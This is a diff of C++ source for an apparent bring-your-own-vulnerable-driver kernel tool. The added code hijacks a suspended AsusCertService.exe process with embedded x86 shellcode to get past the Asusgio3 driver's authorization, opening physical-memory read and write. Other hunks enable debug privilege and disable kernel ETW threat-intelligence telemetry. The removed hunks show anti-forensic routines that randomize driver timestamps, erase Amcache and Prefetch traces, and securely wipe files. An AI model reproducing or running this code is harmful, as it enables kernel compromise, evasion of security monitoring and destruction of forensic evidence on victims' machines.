@@ -5,89 +5,225 @@
 #include <vector>
 #include <filesystem>
 #include <algorithm>
+#include <TlHelp32.h>
 
 #include "utils.hpp"
-#include "service.hpp"
 #include "nt.hpp"
-
-#pragma pack(push, 1)
-typedef struct _PHYS_RW_INPUT {
-	uint64_t physical_address;
-	uint32_t byte_count;
-} PHYS_RW_INPUT;
-#pragma pack(pop)
 
 HANDLE vdrv::hDevice = 0;
 ULONG64 vdrv::ntoskrnlAddr = 0;
 ULONG64 vdrv::ntoskrnlPhysBase = 0;
 ULONG32 vdrv::ntoskrnlImageSize = 0;
 bool vdrv::runtimeReady = false;
-ULONG32 vdrv::loadedDriverTimestamp = 0;
-std::wstring vdrv::vulnerableDriverPath = L"";
-std::wstring vdrv::loadedSymlinkName = L"";
 bool vdrv::g_stubPoolReady = false;
 std::vector<vdrv::StubEntry> vdrv::g_stubPool;
 
 static uint64_t kernel_MmGetPhysicalAddress = 0;
-static std::wstring cachedDriverName = L"";
-static std::wstring cachedDriverPath = L"";
-static std::wstring cachedDriverDir = L"";
+static HANDLE g_zombieProcess = nullptr;
 
-std::wstring vdrv::GetDriverNameW() {
-	if (cachedDriverName.empty()) {
-		cachedDriverName = kdmUtils::GenerateServiceLikeName();
+static unsigned char g_AsIO3Shellcode[667] = {
+	0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x81, 0xEC, 0x8C, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x18, 0x00,
+	0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0x40, 0x30, 0x83, 0x64, 0x24, 0x18, 0x00, 0x6A, 0x5C, 0x5A,
+	0x8B, 0x40, 0x0C, 0x6A, 0x44, 0x8B, 0x40, 0x0C, 0x8B, 0x00, 0x8B, 0x70, 0x18, 0x58, 0x6A, 0x65,
+	0x59, 0x6A, 0x76, 0x66, 0x89, 0x44, 0x24, 0x32, 0x58, 0x6A, 0x69, 0x5F, 0x6A, 0x63, 0x66, 0x89,
+	0x44, 0x24, 0x36, 0x58, 0x6A, 0x41, 0x66, 0x89, 0x44, 0x24, 0x3A, 0x58, 0x6A, 0x73, 0x66, 0x89,
+	0x4C, 0x24, 0x34, 0x66, 0x89, 0x4C, 0x24, 0x3C, 0x59, 0x6A, 0x75, 0x66, 0x89, 0x44, 0x24, 0x40,
+	0x58, 0x6A, 0x67, 0x66, 0x89, 0x44, 0x24, 0x44, 0x58, 0x6A, 0x6F, 0x66, 0x89, 0x44, 0x24, 0x48,
+	0x58, 0x66, 0x89, 0x44, 0x24, 0x48, 0x6A, 0x33, 0x58, 0x66, 0x89, 0x44, 0x24, 0x4A, 0x33, 0xC0,
+	0x66, 0x89, 0x54, 0x24, 0x2C, 0x66, 0x89, 0x54, 0x24, 0x3A, 0xBA, 0x8E, 0x2E, 0x4C, 0xC2, 0x66,
+	0x89, 0x4C, 0x24, 0x3E, 0x66, 0x89, 0x4C, 0x24, 0x42, 0x8B, 0xCE, 0x66, 0x89, 0x7C, 0x24, 0x34,
+	0x66, 0x89, 0x7C, 0x24, 0x46, 0x66, 0x89, 0x44, 0x24, 0x4C, 0xE8, 0x70, 0x01, 0x00, 0x00, 0xBA,
+	0x4A, 0xBC, 0xE2, 0x71, 0x89, 0x44, 0x24, 0x1C, 0x8B, 0xCE, 0xE8, 0x60, 0x01, 0x00, 0x00, 0x8B,
+	0xF8, 0xBA, 0x3E, 0x67, 0x51, 0xCD, 0x8B, 0xCE, 0x89, 0x7C, 0x24, 0x50, 0xE8, 0x4E, 0x01, 0x00,
+	0x00, 0xBA, 0x0A, 0xD8, 0xCC, 0x47, 0x89, 0x44, 0x24, 0x10, 0x8B, 0xCE, 0xE8, 0x3E, 0x01, 0x00,
+	0x00, 0xBA, 0xE5, 0x18, 0x77, 0x54, 0x8B, 0xCE, 0x8B, 0xD8, 0xE8, 0x30, 0x01, 0x00, 0x00, 0x83,
+	0x7C, 0x24, 0x1C, 0x00, 0x8B, 0xF0, 0x0F, 0x84, 0x1B, 0x01, 0x00, 0x00, 0x85, 0xFF, 0x0F, 0x84,
+	0x13, 0x01, 0x00, 0x00, 0x83, 0x7C, 0x24, 0x10, 0x00, 0x0F, 0x84, 0x08, 0x01, 0x00, 0x00, 0x85,
+	0xDB, 0x0F, 0x84, 0x00, 0x01, 0x00, 0x00, 0x85, 0xF6, 0x0F, 0x84, 0xF8, 0x00, 0x00, 0x00, 0x6A,
+	0x18, 0x59, 0x32, 0xC0, 0x8D, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x8D, 0x44, 0x24,
+	0x14, 0x33, 0xFF, 0x50, 0x6A, 0x18, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x57, 0x6A,
+	0xFF, 0xFF, 0xD3, 0x85, 0xC0, 0x0F, 0x88, 0xB5, 0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0x94, 0x00,
+	0x00, 0x00, 0x89, 0x44, 0x24, 0x54, 0x8D, 0x44, 0x24, 0x2C, 0x50, 0x8D, 0x44, 0x24, 0x74, 0x50,
+	0xFF, 0x54, 0x24, 0x18, 0x57, 0x57, 0x57, 0x6A, 0x01, 0x57, 0x57, 0x8D, 0x84, 0x24, 0x88, 0x00,
+	0x00, 0x00, 0xC7, 0x44, 0x24, 0x70, 0x18, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x78, 0x8D, 0x84,
+	0x24, 0x90, 0x00, 0x00, 0x00, 0x57, 0x50, 0x8D, 0x44, 0x24, 0x78, 0x89, 0x7C, 0x24, 0x7C, 0x50,
+	0x68, 0x00, 0x00, 0x00, 0xC0, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00,
+	0x40, 0x00, 0x00, 0x00, 0x50, 0x89, 0xBC, 0x24, 0x94, 0x00, 0x00, 0x00, 0x89, 0xBC, 0x24, 0x98,
+	0x00, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x7C, 0x85, 0xC0, 0x78, 0x45, 0x6A, 0x04, 0x8D, 0x44, 0x24,
+	0x18, 0x89, 0x7C, 0x24, 0x18, 0x50, 0x6A, 0x04, 0x8D, 0x44, 0x24, 0x60, 0x50, 0x68, 0x90, 0xA4,
+	0x40, 0xA0, 0x8D, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x50, 0x57, 0x57, 0x57, 0xFF, 0x74, 0x24,
+	0x3C, 0xFF, 0x54, 0x24, 0x44, 0x85, 0xC0, 0x78, 0x17, 0x83, 0x4C, 0x24, 0x24, 0xFF, 0xC7, 0x44,
+	0x24, 0x20, 0x80, 0x3C, 0x36, 0xFE, 0x8D, 0x44, 0x24, 0x20, 0x50, 0x57, 0xFF, 0xD6, 0xEB, 0xF6,
+	0x83, 0x4C, 0x24, 0x24, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0x80, 0x3C, 0x36, 0xFE, 0x8D, 0x44, 0x24,
+	0x20, 0x50, 0x57, 0xFF, 0xD6, 0xEB, 0xF6, 0xCC, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x55,
+	0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x57, 0x8B, 0xF9, 0x89, 0x55, 0xFC, 0x8B, 0x47, 0x3C, 0x8B,
+	0x44, 0x38, 0x78, 0x03, 0xC7, 0x8B, 0x48, 0x1C, 0x8B, 0x58, 0x20, 0x03, 0xCF, 0x89, 0x4D, 0xEC,
+	0x03, 0xDF, 0x8B, 0x48, 0x24, 0x8B, 0x40, 0x18, 0x03, 0xCF, 0x89, 0x4D, 0xF0, 0x33, 0xC9, 0x89,
+	0x5D, 0xF4, 0x8B, 0xD1, 0x89, 0x45, 0xF8, 0x85, 0xC0, 0x74, 0x3A, 0x56, 0x8B, 0x34, 0x93, 0x8B,
+	0xD9, 0x03, 0xF7, 0xEB, 0x0A, 0x0F, 0xBE, 0xC0, 0x33, 0xD8, 0xC1, 0xC3, 0x03, 0x43, 0x46, 0x8A,
+	0x06, 0x84, 0xC0, 0x75, 0xF0, 0x3B, 0x5D, 0xFC, 0x74, 0x0B, 0x8B, 0x5D, 0xF4, 0x42, 0x3B, 0x55,
+	0xF8, 0x72, 0xD9, 0xEB, 0x0F, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xEC, 0x0F, 0xB7, 0x04, 0x50, 0x8B,
+	0x0C, 0x81, 0x03, 0xCF, 0x5E, 0x5F, 0x8B, 0xC1, 0x5B, 0xC9, 0xC3
+};
+
+static bool FindAsusCertService(wchar_t* outPath, size_t maxLen) {
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnap != INVALID_HANDLE_VALUE) {
+		PROCESSENTRY32W pe = {};
+		pe.dwSize = sizeof(pe);
+		if (Process32FirstW(hSnap, &pe)) {
+			do {
+				if (_wcsicmp(pe.szExeFile, L"AsusCertService.exe") == 0) {
+					HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
+					if (hProc) {
+						DWORD sz = (DWORD)maxLen;
+						if (QueryFullProcessImageNameW(hProc, 0, outPath, &sz)) {
+							CloseHandle(hProc);
+							CloseHandle(hSnap);
+							return true;
+						}
+						CloseHandle(hProc);
+					}
+				}
+			} while (Process32NextW(hSnap, &pe));
+		}
+		CloseHandle(hSnap);
 	}
-	return cachedDriverName;
-}
 
-std::wstring vdrv::GetDriverPath() {
-	if (!cachedDriverPath.empty())
-		return cachedDriverPath;
-
-	std::wstring base = kdmUtils::GetSystemDataPath();
-	if (base.empty())
-		base = kdmUtils::GetFullTempPath();
-	if (base.empty())
-		return L"";
-
-	std::wstring subdir = base + L"\\" + kdmUtils::GenerateCryptoRandomName(6, 10);
-	CreateDirectoryW(subdir.c_str(), NULL);
-
-	static const wchar_t* innocuous_prefixes[] = {
-		L"audiosrv", L"netmgr", L"wmicache", L"usbhub", L"dxgi", L"telemetry", L"spoolsvc",
-		L"mssrv", L"ntsys", L"wdiag", L"pnpmon", L"evtsys"
+	static const wchar_t* searchDirs[] = {
+		L"C:\\Program Files (x86)\\ASUS\\ArmouryCrate.UserSessionHelper",
+		L"C:\\Program Files (x86)\\ASUS\\AXSP",
+		L"C:\\Program Files\\ASUS\\ARMOURY CRATE Service",
+		L"C:\\Program Files (x86)\\ASUS\\ArmouryCrate Service",
+		L"C:\\Program Files\\ASUS\\ArmouryCrate.UserSessionHelper",
 	};
-	const wchar_t* pfx = innocuous_prefixes[kdmUtils::CryptoRand32() % (sizeof(innocuous_prefixes) / sizeof(innocuous_prefixes[0]))];
 
-	cachedDriverDir = subdir;
-	cachedDriverPath = subdir + L"\\" + pfx + GetDriverNameW() + L".sys";
-	return cachedDriverPath;
-}
-
-std::wstring vdrv::GetSymlinkName() {
-	return loadedSymlinkName;
-}
-
-HANDLE vdrv::OpenDeviceHandle() {
-	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
-	return CreateFileW(devPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-}
-
-void vdrv::CloseDeviceHandle() {
-	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
-		CloseHandle(hDevice);
-		hDevice = 0;
+	for (const auto& dir : searchDirs) {
+		std::wstring candidate = std::wstring(dir) + L"\\AsusCertService.exe";
+		if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES) {
+			wcsncpy_s(outPath, maxLen, candidate.c_str(), _TRUNCATE);
+			return true;
+		}
 	}
+
+	for (const auto& dir : searchDirs) {
+		std::wstring searchPath = std::wstring(dir);
+		WIN32_FIND_DATAW fd = {};
+		HANDLE hFind = FindFirstFileW((searchPath + L"\\*").c_str(), &fd);
+		if (hFind == INVALID_HANDLE_VALUE) continue;
+		do {
+			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+			if (fd.cFileName[0] == L'.') continue;
+			std::wstring sub = searchPath + L"\\" + fd.cFileName + L"\\AsusCertService.exe";
+			if (GetFileAttributesW(sub.c_str()) != INVALID_FILE_ATTRIBUTES) {
+				wcsncpy_s(outPath, maxLen, sub.c_str(), _TRUNCATE);
+				FindClose(hFind);
+				return true;
+			}
+		} while (FindNextFileW(hFind, &fd));
+		FindClose(hFind);
+	}
+
+	return false;
+}
+
+static bool InjectShellcodeAndRegister(const wchar_t* exePath, HANDLE* outZombie) {
+	*outZombie = nullptr;
+
+	BYTE headers[4096];
+	{
+		HANDLE hFile = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
+		if (hFile == INVALID_HANDLE_VALUE) return false;
+		DWORD rd = 0;
+		ReadFile(hFile, headers, sizeof(headers), &rd, nullptr);
+		CloseHandle(hFile);
+		if (rd < sizeof(IMAGE_DOS_HEADER)) return false;
+	}
+
+	auto dos = (PIMAGE_DOS_HEADER)headers;
+	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+	auto nt32 = (PIMAGE_NT_HEADERS32)(headers + dos->e_lfanew);
+	if (nt32->Signature != IMAGE_NT_SIGNATURE) return false;
+	if (nt32->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) return false;
+
+	DWORD entryRva = nt32->OptionalHeader.AddressOfEntryPoint;
+
+	STARTUPINFOW si = {};
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+	PROCESS_INFORMATION pi = {};
+
+	wchar_t cmdLine[MAX_PATH + 4];
+	wcscpy_s(cmdLine, exePath);
+
+	if (!CreateProcessW(exePath, cmdLine, nullptr, nullptr, FALSE,
+		CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
+		return false;
+
+	typedef NTSTATUS(NTAPI* tNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+	auto pNtQIP = (tNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+	if (!pNtQIP) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		return false;
+	}
+
+	ULONG_PTR wow64Peb = 0;
+	pNtQIP(pi.hProcess, 26, &wow64Peb, sizeof(wow64Peb), nullptr);
+
+	DWORD actualBase = 0;
+	if (wow64Peb) {
+		ReadProcessMemory(pi.hProcess, (PVOID)(wow64Peb + 0x08), &actualBase, sizeof(actualBase), nullptr);
+	}
+
+	if (!actualBase)
+		actualBase = nt32->OptionalHeader.ImageBase;
+
+	DWORD entryAddr = actualBase + entryRva;
+
+	DWORD oldProt = 0;
+	VirtualProtectEx(pi.hProcess, (LPVOID)(ULONG_PTR)entryAddr, sizeof(g_AsIO3Shellcode), PAGE_EXECUTE_READWRITE, &oldProt);
+	SIZE_T written = 0;
+	if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ULONG_PTR)entryAddr, g_AsIO3Shellcode, sizeof(g_AsIO3Shellcode), &written) ||
+		written != sizeof(g_AsIO3Shellcode)) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		return false;
+	}
+
+	ResumeThread(pi.hThread);
+	CloseHandle(pi.hThread);
+
+	*outZombie = pi.hProcess;
+	return true;
+}
+
+static HANDLE OpenAsIO3Device() {
+	auto devName = ENC("\\\\.\\Asusgio3");
+	return CreateFileA(devName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+}
+
+static bool BypassAsIO3Auth() {
+	wchar_t exePath[MAX_PATH] = {};
+	if (!FindAsusCertService(exePath, MAX_PATH))
+		return false;
+
+	HANDLE zombie = nullptr;
+	if (!InjectShellcodeAndRegister(exePath, &zombie))
+		return false;
+
+	g_zombieProcess = zombie;
+	Sleep(3000);
+	return true;
 }
 
 bool vdrv::IsRunning() {
-	if (loadedSymlinkName.empty())
-		return false;
-	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
-	const HANDLE file_handle = CreateFileW(devPath.c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
-	{
-		CloseHandle(file_handle);
+	HANDLE h = OpenAsIO3Device();
+	if (h && h != INVALID_HANDLE_VALUE) {
+		CloseHandle(h);
 		return true;
 	}
 	return false;
@@ -158,14 +294,9 @@ bool vdrv::PickStub(uint64_t& out_kaddr, std::string& out_name) {
 }
 
 NTSTATUS vdrv::AcquireDebugPrivilege() {
-	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
-	if (ntdll == NULL)
-		return STATUS_UNSUCCESSFUL;
-
 	ULONG SE_DEBUG_PRIVILEGE = 20UL;
 	BOOLEAN SeDebugWasEnabled;
-	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
-	return Status;
+	return nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
 }
 
 static uint8_t g_EtwOriginalBytes[8] = { 0 };
@@ -216,11 +347,6 @@ static bool     g_etwTiWasDisabled = false;
 static bool DisableKernelEtwTi() {
 	if (!vdrv::runtimeReady)
 		return false;
-
-	static const uint8_t etwTiGuid[] = {
-		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
-		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
-	};
 
 	BYTE guidSig[] = {
 		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
@@ -275,294 +401,6 @@ static bool RestoreKernelEtwTi() {
 	return ok;
 }
 
-static size_t PatchSymlinkInBuffer(BYTE* buf, size_t size, const std::wstring& newName) {
-	static const wchar_t needleW[] = L"__WDT__";
-	const size_t needleBytes = (sizeof(needleW) - sizeof(wchar_t));
-	const BYTE* needle = reinterpret_cast<const BYTE*>(needleW);
-
-	size_t newNameWChars = newName.size();
-	if (newNameWChars * sizeof(wchar_t) != needleBytes)
-		return 0;
-
-	size_t hits = 0;
-	for (size_t i = 0; i + needleBytes <= size; i++) {
-		if (memcmp(buf + i, needle, needleBytes) == 0) {
-			memcpy(buf + i, newName.data(), needleBytes);
-			hits++;
-		}
-	}
-	return hits;
-}
-
-static bool PatchDriverFile(const std::wstring& driver_path, ULONG32* out_timestamp, std::wstring* out_symlink) {
-	HANDLE hFile = CreateFileW(driver_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-	if (hFile == INVALID_HANDLE_VALUE)
-		return false;
-
-	DWORD fileSize = GetFileSize(hFile, nullptr);
-	if (!fileSize || fileSize > 32 * 1024 * 1024) {
-		CloseHandle(hFile);
-		return false;
-	}
-
-	auto buffer = std::make_unique<BYTE[]>(fileSize);
-	DWORD bytesRead = 0;
-	if (!ReadFile(hFile, buffer.get(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
-		CloseHandle(hFile);
-		return false;
-	}
-
-	auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.get());
-	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-		CloseHandle(hFile);
-		return false;
-	}
-
-	auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer.get() + dosHeader->e_lfanew);
-	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-		CloseHandle(hFile);
-		return false;
-	}
-
-	ULONG32 realisticLow  = 0x55000000u;
-	ULONG32 realisticHigh = 0x68c00000u;
-	ULONG32 range = realisticHigh - realisticLow;
-	ULONG32 newTimestamp = realisticLow + (kdmUtils::CryptoRand32() % range);
-	ntHeaders->FileHeader.TimeDateStamp = newTimestamp;
-
-	ntHeaders->OptionalHeader.CheckSum = 0;
-
-	std::wstring newSymlink = kdmUtils::GenerateCryptoRandomName(7, 7);
-	size_t hits = PatchSymlinkInBuffer(buffer.get(), fileSize, newSymlink);
-
-	auto hiddenSection = [&](const char* name) -> PIMAGE_SECTION_HEADER {
-		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
-		for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-			if (memcmp(sections[i].Name, name, strlen(name)) == 0)
-				return &sections[i];
-		}
-		return nullptr;
-	};
-
-	auto patchTailPaddingIfZero = [&](PIMAGE_SECTION_HEADER sec, DWORD max_bytes) {
-		if (!sec)
-			return;
-		if (sec->SizeOfRawData <= sec->Misc.VirtualSize)
-			return;
-		DWORD padding_start = sec->PointerToRawData + sec->Misc.VirtualSize;
-		DWORD padding_bytes = sec->SizeOfRawData - sec->Misc.VirtualSize;
-		DWORD patch_bytes = padding_bytes < max_bytes ? padding_bytes : max_bytes;
-		if (patch_bytes < 8)
-			return;
-		if (padding_start + patch_bytes > fileSize)
-			return;
-		for (DWORD k = 0; k < patch_bytes; k++) {
-			if (buffer[padding_start + k] != 0)
-				return;
-		}
-		kdmUtils::CryptoFill(buffer.get() + padding_start, patch_bytes);
-	};
-
-	patchTailPaddingIfZero(hiddenSection(".reloc"), 16);
-
-	PIMAGE_SECTION_HEADER rsrc_sec = hiddenSection(".rsrc");
-	if (rsrc_sec) {
-		bool has_version = false;
-		if (rsrc_sec->PointerToRawData && rsrc_sec->SizeOfRawData >= 32 &&
-			rsrc_sec->PointerToRawData + rsrc_sec->SizeOfRawData <= fileSize) {
-			static const uint8_t vs_marker[] = { 'V', 0, 'S', 0, '_', 0, 'V', 0, 'E', 0, 'R', 0, 'S', 0, 'I', 0, 'O', 0, 'N', 0 };
-			BYTE* rsrc_data = buffer.get() + rsrc_sec->PointerToRawData;
-			DWORD rsrc_sz = rsrc_sec->SizeOfRawData;
-			for (DWORD k = 0; k + sizeof(vs_marker) <= rsrc_sz; k++) {
-				if (memcmp(rsrc_data + k, vs_marker, sizeof(vs_marker)) == 0) {
-					has_version = true;
-					break;
-				}
-			}
-		}
-		if (!has_version)
-			patchTailPaddingIfZero(rsrc_sec, 32);
-	}
-
-	auto& debugDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
-	if (debugDir.VirtualAddress && debugDir.Size) {
-		DWORD dbg_off = 0;
-		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
-		for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-			if (debugDir.VirtualAddress >= sections[i].VirtualAddress &&
-				debugDir.VirtualAddress < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
-				dbg_off = sections[i].PointerToRawData + (debugDir.VirtualAddress - sections[i].VirtualAddress);
-				break;
-			}
-		}
-		if (dbg_off && dbg_off + debugDir.Size <= fileSize) {
-			kdmUtils::CryptoFill(buffer.get() + dbg_off, debugDir.Size);
-		}
-	}
-
-	SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
-	DWORD bytesWritten = 0;
-	WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, nullptr);
-	FlushFileBuffers(hFile);
-	CloseHandle(hFile);
-
-	if (out_timestamp)
-		*out_timestamp = newTimestamp;
-	if (out_symlink && hits > 0)
-		*out_symlink = newSymlink;
-	else if (out_symlink)
-		*out_symlink = L"";
-
-	return true;
-}
-
-static void CleanupAmcacheForFile(const std::wstring& driver_path) {
-	std::wstring filename;
-	try {
-		filename = std::filesystem::path(driver_path).filename().wstring();
-	}
-	catch (...) {
-		return;
-	}
-	if (filename.empty())
-		return;
-
-	static const wchar_t* amcache_roots[] = {
-		L"SOFTWARE\\Microsoft\\Amcache\\Root\\InventoryApplicationFile",
-		L"SOFTWARE\\Microsoft\\Amcache\\Root\\InventoryDriverBinary",
-		L"SOFTWARE\\Microsoft\\Amcache\\Root\\File",
-		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppCompatFlags\\CompatibilityAssistant\\ROOT\\InventoryApplicationFile",
-		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppCompatFlags\\CompatibilityAssistant\\ROOT\\InventoryDriverBinary",
-		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppCompatFlags\\CompatibilityAssistant\\ROOT\\File",
-	};
-
-	for (const wchar_t* amroot : amcache_roots) {
-		HKEY hRoot = NULL;
-		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, amroot, 0,
-			KEY_READ | KEY_WRITE | KEY_WOW64_64KEY, &hRoot) != ERROR_SUCCESS) {
-			continue;
-		}
-
-		DWORD subkey_count = 0;
-		DWORD max_name_len = 0;
-		if (RegQueryInfoKeyW(hRoot, nullptr, nullptr, nullptr, &subkey_count,
-			&max_name_len, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) {
-			RegCloseKey(hRoot);
-			continue;
-		}
-
-		if (subkey_count == 0) {
-			RegCloseKey(hRoot);
-			continue;
-		}
-
-		std::vector<std::wstring> to_delete;
-		max_name_len += 2;
-		auto name_buf = std::make_unique<wchar_t[]>(max_name_len);
-
-		for (DWORD i = 0; i < subkey_count; i++) {
-			DWORD name_sz = max_name_len;
-			if (RegEnumKeyExW(hRoot, i, name_buf.get(), &name_sz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
-				continue;
-
-			HKEY hChild;
-			if (RegOpenKeyExW(hRoot, name_buf.get(), 0, KEY_READ | KEY_WOW64_64KEY, &hChild) != ERROR_SUCCESS)
-				continue;
-
-			wchar_t low_filename[MAX_PATH];
-			DWORD low_sz = sizeof(low_filename);
-			if (RegQueryValueExW(hChild, L"LowerCaseLongPath", nullptr, nullptr,
-				reinterpret_cast<LPBYTE>(low_filename), &low_sz) == ERROR_SUCCESS) {
-				std::wstring lp(low_filename);
-				std::wstring filename_lower = filename;
-				std::transform(filename_lower.begin(), filename_lower.end(), filename_lower.begin(), ::towlower);
-				std::transform(lp.begin(), lp.end(), lp.begin(), ::towlower);
-				if (lp.find(filename_lower) != std::wstring::npos)
-					to_delete.push_back(name_buf.get());
-			}
-			RegCloseKey(hChild);
-		}
-
-		for (const auto& k : to_delete)
-			RegDeleteTreeW(hRoot, k.c_str());
-
-		RegCloseKey(hRoot);
-	}
-}
-
-static void CleanupPrefetch(const std::wstring& driver_path) {
-	wchar_t winDir[MAX_PATH + 1] = { 0 };
-	if (!GetWindowsDirectoryW(winDir, MAX_PATH))
-		return;
-
-	std::wstring prefetchDir = std::wstring(winDir) + L"\\Prefetch";
-
-	std::error_code ec;
-	if (!std::filesystem::exists(prefetchDir, ec))
-		return;
-
-	std::wstring filename;
-	try {
-		filename = std::filesystem::path(driver_path).filename().wstring();
-	}
-	catch (...) {
-		return;
-	}
-	if (filename.empty())
-		return;
-
-	for (auto& ch : filename)
-		ch = (wchar_t)towupper(ch);
-
-	std::wstring pattern = prefetchDir + L"\\" + filename + L"-*.pf";
-
-	WIN32_FIND_DATAW findData = { 0 };
-	HANDLE hFind = FindFirstFileW(pattern.c_str(), &findData);
-	if (hFind == INVALID_HANDLE_VALUE)
-		return;
-
-	do {
-		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-			continue;
-		std::wstring fullPath = prefetchDir + L"\\" + findData.cFileName;
-		SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
-		DeleteFileW(fullPath.c_str());
-	} while (FindNextFileW(hFind, &findData));
-
-	FindClose(hFind);
-}
-
-static void SecureDeleteFile(const std::wstring& path) {
-	HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-	if (hFile != INVALID_HANDLE_VALUE) {
-		LARGE_INTEGER fileSize;
-		GetFileSizeEx(hFile, &fileSize);
-
-		auto junkSize = static_cast<DWORD>(fileSize.QuadPart + (kdmUtils::CryptoRand32() % 4096));
-		auto junk = std::make_unique<BYTE[]>(junkSize);
-
-		HCRYPTPROV hProv = 0;
-		CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
-		CryptGenRandom(hProv, junkSize, junk.get());
-		CryptReleaseContext(hProv, 0);
-
-		SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
-		DWORD written = 0;
-		WriteFile(hFile, junk.get(), junkSize, &written, nullptr);
-		FlushFileBuffers(hFile);
-		CloseHandle(hFile);
-	}
-
-	for (int pass = 0; pass < 3; pass++) {
-		if (_wremove(path.c_str()) == 0)
-			break;
-		Sleep(50);
-	}
-
-	std::wstring dir = path.substr(0, path.find_last_of(L'\\'));
-	RemoveDirectoryW(dir.c_str());
-}
-
 bool vdrv::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) {
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
 		return false;
@@ -571,16 +409,31 @@ bool vdrv::PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size) 
 	while (offset < size) {
 		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);
 
-		PHYS_RW_INPUT input = {};
-		input.physical_address = physical_address + offset;
-		input.byte_count = chunk;
+		WINIO_PHYSICAL_MEMORY_INFO request = {};
+		request.ViewSize = chunk;
+		request.BusAddress = physical_address + offset;
 
 		DWORD bytes_returned = 0;
